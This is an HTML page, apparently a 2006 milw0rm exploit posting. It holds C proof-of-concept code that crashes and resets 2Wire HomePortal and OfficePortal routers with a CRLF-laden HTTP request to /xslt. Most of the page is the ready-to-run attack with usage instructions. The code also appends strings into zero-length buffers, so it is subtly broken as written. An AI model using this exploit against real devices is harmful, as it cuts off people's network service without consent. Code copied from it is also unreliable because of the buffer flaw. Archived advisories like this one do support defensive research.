<html><head><title>2wire Modems/Routers CRLF Denial of Service Exploit</title></head><pre>//Vulnerable: 	
//2Wire OfficePortal 0
//2Wire HomePortal 1500W
//2Wire HomePortal 100W
//2Wire HomePortal 100S
//2Wire HomePortal 1000W
//2Wire HomePortal 1000SW
//2Wire HomePortal 1000S
//2Wire HomePortal 1000
//2Wire HomePortal 0
////////////////////////////////// [ STARTING CODE ]
////////////////////////////////////////////////////
////
////  [ Explanation ] this PoC make an evil_request
////  and send to the server , when the server process
////  it the request fall him, AND THE MODEM WILL RESET!.
////
////  [ Note ] This Poc was coded  using Dev-C++  4.9.9.2
////  If you have any error with the librarys you need
////  include libws2_32.a at the project.
////
////                Enjoy it n_nU!..
////    Coded by preth00nker (using Mexican skill!)

#pragma comment(lib,&quot;libws2_32.a&quot;)
#include &lt;string.h&gt;               
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;winsock2.h&quot;

unsigned long dir;
char h[]=&quot;&quot;;
short port;
char badreq[]=&quot;&quot;;
int state;

int main(int argc, char *argv[])
{
 printf(&quot;\n################################################\n&quot;);
 printf(&quot;####\n&quot;);
 printf(&quot;####          PoC of DoS 2wire_Gateway\n&quot;);
 printf(&quot;####               By Preth00nker\n&quot;);
 printf(&quot;####         http://www.mexhackteam.org\n&quot;);
 printf(&quot;####\n&quot;);
 printf(&quot;####\n\n&quot;);
     if  (argc&lt;4){
     printf(&quot;[Usage] %s $Host $Port $Variable\n&quot;,argv[0]);
     printf(&quot;\n[I.E.] %s 192.168.1.254 80 PAGE\n&quot;,argv[0]);
     return 0;
     }
    //Crear socket
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2),&amp;wsaData);
    SOCKET wsck;
    //Estructuras
    struct sockaddr_in Wins;
    struct hostent *target;
    //Wins
    Wins.sin_family=AF_INET;
    Wins.sin_port=htons((short)atoi(argv[2]));
    target=gethostbyname(argv[1]);
    Wins.sin_addr.s_addr=inet_addr(inet_ntoa(*(struct in_addr *)target-&gt;h_addr));
    //llamamos al socket
    wsck=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,(int unsigned)NULL,(int unsigned)NULL,(int unsigned)NULL);
    //Verifica por error
    if (wsck==SOCKET_ERROR){printf(&quot;Error al crear el socket =!..&quot;);WSACleanup();return 0;}
    printf(&quot;Socket creado correctamente!..  hWndl: %d&quot;,wsck);
    //Conecta
    if(WSAConnect(wsck,(SOCKADDR*)&amp;Wins,sizeof(Wins),NULL,NULL,NULL,NULL)==SOCKET_ERROR){
        WSACleanup();
        return 0;
        printf(&quot;\nError al conectar =!..&quot;);
    }
    printf(&quot;\nConectado!..&quot;);
    //Make a bad query and send it ..Mwajuajua!..
    strcat(badreq,&quot;GET /xslt?&quot;);
    strcat(badreq,argv[3]);
    strcat(badreq,&quot;=%0D%0A HTTP/1.0\r\n&quot;);
    strcat(badreq,&quot;Accept-Language: es-mx\r\n&quot;);
    strcat(badreq,&quot;User-Agent: MexHackTeam\r\n&quot;);
    strcat(badreq,&quot;Host: &quot;);   
    strcat(badreq,argv[1]);
    strcat(badreq, &quot;\r\n\r\n\r\n&quot;);
    send(wsck , badreq ,(int)strlen(badreq), 0);
    printf(&quot;\nDatos Mandados!..&quot;);
    //finalized
    Sleep(100);
    printf(&quot;\nThat's all, Check this out!...\n&quot;);
    WSACleanup();
    return 0;
}
//////////////////////////////////////////// [ EOF ]
////////////////////////////////////////////////////

// milw0rm.com [2006-08-22]</pre></html>